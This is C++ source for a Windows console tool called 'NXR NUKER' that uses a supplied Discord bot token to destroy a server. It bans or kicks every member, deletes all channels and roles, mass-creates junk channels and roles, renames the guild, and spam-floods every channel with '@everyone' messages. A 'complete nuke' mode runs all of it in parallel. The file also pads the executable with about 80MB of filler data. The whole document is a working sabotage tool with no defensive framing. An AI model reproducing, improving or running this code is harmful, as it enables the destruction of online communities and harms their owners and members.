#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <iostream>
#include <chrono>
#include <random>
#include <thread>
#include <mutex>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

// ========== SIZE PADDING (for larger EXE) ==========
const char pad1[1024*1024*8] = {1};   // 8MB
const char pad2[1024*1024*8] = {2};   // 8MB
const char pad3[1024*1024*8] = {3};   // 8MB
const char pad4[1024*1024*8] = {4};   // 8MB
const char pad5[1024*1024*8] = {5};   // 8MB
const char pad6[1024*1024*8] = {6};   // 8MB
const char pad7[1024*1024*8] = {7};   // 8MB
const char pad8[1024*1024*8] = {8};   // 8MB
const char pad9[1024*1024*8] = {9};   // 8MB
const char pad10[1024*1024*8] = {10}; // 8MB
// total \~80MB padding

std::string g_token, g_guild;
std::mt19937 rng{std::random_device{}()};
std::mutex log_mtx;

void set_color(int c) { SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), c); }

void log(const std::string& msg, int color = 12) {
    std::lock_guard<std::mutex> lock(log_mtx);
    set_color(color);
    std::cout << msg << std::endl;
    set_color(7);
}

std::string http(const std::string& method, const std::string& endpoint, const std::string& body = "") {
    HINTERNET hInternet = InternetOpenA("NXR", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";
    HINTERNET hConnect = InternetConnectA(hInternet, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return ""; }

    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;
    std::string path = "/api/v10" + endpoint;
    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), "HTTP/1.1", NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    std::string headers = "Authorization: Bot " + g_token + "\r\nContent-Type: application/json\r\nUser-Agent: NXR\r\n";
    BOOL ok = body.empty() ?
        HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.size(), NULL, 0) :
        HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.size(), (LPVOID)body.c_str(), (DWORD)body.size());

    std::string resp;
    if (ok) {
        char buf[4096];
        DWORD bytes = 0;
        while (InternetReadFile(hRequest, buf, sizeof(buf)-1, &bytes) && bytes > 0) {
            buf[bytes] = 0;
            resp += buf;
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    std::this_thread::sleep_for(std::chrono::milliseconds(1 + (rng() % 3))); // 0.5s feel
    return resp;
}

std::vector<std::string> get_ids(const std::string& json) {
    std::vector<std::string> ids;
    size_t pos = 0;
    while ((pos = json.find("\"id\":\"", pos)) != std::string::npos) {
        pos += 6;
        size_t end = json.find('"', pos);
        if (end != std::string::npos) {
            ids.push_back(json.substr(pos, end - pos));
            pos = end + 1;
        } else break;
    }
    return ids;
}

std::string get_username(const std::string& json) {
    size_t pos = json.find("\"username\":\"");
    if (pos == std::string::npos) return "unknown";
    pos += 12;
    size_t end = json.find('"', pos);
    return (end == std::string::npos) ? "unknown" : json.substr(pos, end - pos);
}

void banner() {
    system("cls");
    set_color(15);
    // ekdom choto clear name
    std::cout << "\n\n";
    std::cout << "          N X R   N U K E R\n";
    std::cout << "          -----------------\n";
    set_color(12);
    std::cout << "          PRO v15.0 | 0.5s EXTREME\n";
    std::cout << "          Full Parallel + Live Logs\n\n";
    set_color(7);
}

void ban_members() {
    std::string reason;
    std::cout << "Ban reason: ";
    std::getline(std::cin, reason);
    if (reason.empty()) reason = "NXR NUKER";

    log("[i] Fetching members...", 11);
    std::vector<std::string> members;
    std::string after = "0";
    for (int i = 0; i < 150; ++i) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = get_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        std::cout << "\r[i] Loaded " << members.size() << " members" << std::flush;
        if (ids.size() < 100) break;
    }
    std::cout << std::endl;

    log("[!] PARALLEL BAN " + std::to_string(members.size()) + " members", 12);
    std::vector<std::thread> pool;
    for (auto& uid : members) {
        pool.emplace_back([uid, reason]() {
            std::string info = http("GET", "/users/" + uid);
            std::string name = get_username(info);
            http("PUT", "/guilds/" + g_guild + "/bans/" + uid, "{\"delete_message_days\":7,\"reason\":\"" + reason + "\"}");
            log("[+] BANNED → " + name + " (" + uid + ")", 10);
        });
    }
    for (auto& t : pool) t.join();
    log("[+] BAN COMPLETE", 10);
}

void kick_members() {
    log("[i] Fetching members...", 11);
    std::vector<std::string> members;
    std::string after = "0";
    for (int i = 0; i < 150; ++i) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = get_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        if (ids.size() < 100) break;
    }

    log("[!] PARALLEL KICK " + std::to_string(members.size()), 12);
    std::vector<std::thread> pool;
    for (auto& uid : members) {
        pool.emplace_back([uid]() {
            http("DELETE", "/guilds/" + g_guild + "/members/" + uid);
            log("[+] KICKED → " + uid, 10);
        });
    }
    for (auto& t : pool) t.join();
    log("[+] KICK COMPLETE", 10);
}

void delete_channels() {
    log("[i] Fetching channels...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = get_ids(resp);
    log("[!] PARALLEL DELETE " + std::to_string(channels.size()) + " channels", 12);

    std::vector<std::thread> pool;
    for (auto& id : channels) {
        pool.emplace_back([id]() {
            http("DELETE", "/channels/" + id);
            log("[+] DELETED CHANNEL → " + id, 10);
        });
    }
    for (auto& t : pool) t.join();
    log("[+] CHANNELS DELETED", 10);
}

void delete_roles() {
    log("[i] Fetching roles...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/roles");
    auto roles = get_ids(resp);
    log("[!] PARALLEL DELETE ROLES", 12);

    std::vector<std::thread> pool;
    for (auto& id : roles) {
        if (id == g_guild) continue; // skip @everyone
        pool.emplace_back([id]() {
            std::string res = http("DELETE", "/guilds/" + g_guild + "/roles/" + id);
            log("[+] DELETED ROLE → " + id, 10);
        });
    }
    for (auto& t : pool) t.join();
    log("[+] ROLES DELETED", 10);
}

void create_channels() {
    std::string prefix;
    int count = 0;
    std::cout << "Channel prefix: ";
    std::getline(std::cin, prefix);
    if (prefix.empty()) prefix = "nxr";
    std::cout << "How many channels: ";
    std::cin >> count;
    std::cin.ignore();

    log("[!] PARALLEL CREATE " + std::to_string(count) + " channels", 12);
    std::vector<std::thread> pool;
    for (int i = 0; i < count; ++i) {
        pool.emplace_back([prefix, i]() {
            std::string name = prefix + "-" + std::to_string(i);
            std::string body = "{\"name\":\"" + name + "\",\"type\":0}";
            http("POST", "/guilds/" + g_guild + "/channels", body);
            log("[+] CREATED CHANNEL → " + name, 10);
        });
    }
    for (auto& t : pool) t.join();
    log("[+] " + std::to_string(count) + " CHANNELS CREATED", 10);
}

void create_roles() {
    std::string prefix;
    int count = 0;
    std::cout << "Role prefix: ";
    std::getline(std::cin, prefix);
    if (prefix.empty()) prefix = "NXR";
    std::cout << "How many roles: ";
    std::cin >> count;
    std::cin.ignore();

    log("[!] PARALLEL CREATE " + std::to_string(count) + " roles", 12);
    std::vector<std::thread> pool;
    for (int i = 0; i < count; ++i) {
        pool.emplace_back([prefix, i]() {
            std::string name = prefix + "-" + std::to_string(i);
            std::string body = "{\"name\":\"" + name + "\",\"color\":16711680,\"hoist\":true}";
            std::string res = http("POST", "/guilds/" + g_guild + "/roles", body);
            log("[+] CREATED ROLE → " + name, 10);
        });
    }
    for (auto& t : pool) t.join();
    log("[+] " + std::to_string(count) + " ROLES CREATED", 10);
}

void rename_server() {
    std::string name;
    std::cout << "New server name: ";
    std::getline(std::cin, name);
    if (name.empty()) name = "NXR DESTROYED";
    http("PATCH", "/guilds/" + g_guild, "{\"name\":\"" + name + "\"}");
    log("[+] SERVER RENAMED → " + name, 10);
}

void spam_worker(std::string ch, std::string msg, int count) {
    for (int i = 0; i < count; ++i) {
        http("POST", "/channels/" + ch + "/messages", "{\"content\":\"" + msg + "\"}");
    }
    log("[+] SPAM FINISHED → " + ch, 10);
}

void spam_channels() {
    std::string msg;
    int count = 0;
    std::cout << "Spam message: ";
    std::getline(std::cin, msg);
    if (msg.empty()) msg = "@everyone NXR NUKED";
    std::cout << "Messages per channel: ";
    std::cin >> count;
    std::cin.ignore();

    log("[i] Fetching channels...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = get_ids(resp);

    log("[!] FULL PARALLEL SPAM → " + std::to_string(channels.size()) + " channels x" + std::to_string(count), 12);

    std::vector<std::thread> pool;
    pool.reserve(channels.size());
    for (auto& ch : channels) {
        pool.emplace_back(spam_worker, ch, msg, count);
    }
    for (auto& t : pool) t.join();

    log("[+] ALL " + std::to_string(channels.size()) + " CHANNELS SPAMMED", 10);
}

void complete_nuke() {
    log("[!] ========== COMPLETE NUKE START ==========", 12);
    rename_server();
    std::thread t1(delete_channels);
    std::thread t2(delete_roles);
    t1.join(); t2.join();
    std::thread t3(create_channels);
    std::thread t4(create_roles);
    t3.join(); t4.join();
    std::thread t5(ban_members);
    std::thread t6(spam_channels);
    t5.join(); t6.join();
    log("[!] ========== NUKE FINISHED ==========", 10);
}

int main() {
    // force keep padding
    volatile const char* keep = pad1; keep = pad5; keep = pad10;

    SetConsoleTitleA("NXR NUKER v15.0 - 0.5s EXTREME");
    system("color 0C");

    banner();
    set_color(15);
    std::cout << "Bot Token : ";
    std::getline(std::cin, g_token);
    std::cout << "Guild ID  : ";
    std::getline(std::cin, g_guild);
    set_color(7);

    std::string test = http("GET", "/guilds/" + g_guild);
    if (test.find("\"id\"") != std::string::npos)
        log("[+] Bot is in the server", 10);
    else
        log("[!] Bot NOT in server - check token & permissions", 12);

    while (true) {
        banner();
        set_color(12);
        std::cout << " (1) Ban Members (live name + id)\n";
        std::cout << " (2) Kick Members\n";
        std::cout << " (3) Create Channels (live name)\n";
        std::cout << " (4) Create Roles (live name)\n";
        std::cout << " (5) Rename Server\n";
        std::cout << " (6) Delete Channels\n";
        std::cout << " (7) Delete Roles\n";
        std::cout << " (8) Spam All Channels (full parallel)\n";
        std::cout << " (9) COMPLETE NUKE\n";
        std::cout << "(10) Exit\n";
        set_color(7);
        std::cout << "\nSelect: ";

        int choice;
        std::cin >> choice;
        std::cin.ignore();

        switch (choice) {
            case 1: ban_members(); break;
            case 2: kick_members(); break;
            case 3: create_channels(); break;
            case 4: create_roles(); break;
            case 5: rename_server(); break;
            case 6: delete_channels(); break;
            case 7: delete_roles(); break;
            case 8: spam_channels(); break;
            case 9: complete_nuke(); break;
            case 10: return 0;
            default: log("Invalid", 12);
        }

        std::cout << "\nPress Enter...";
        std::cin.get();
    }
    return 0;
}
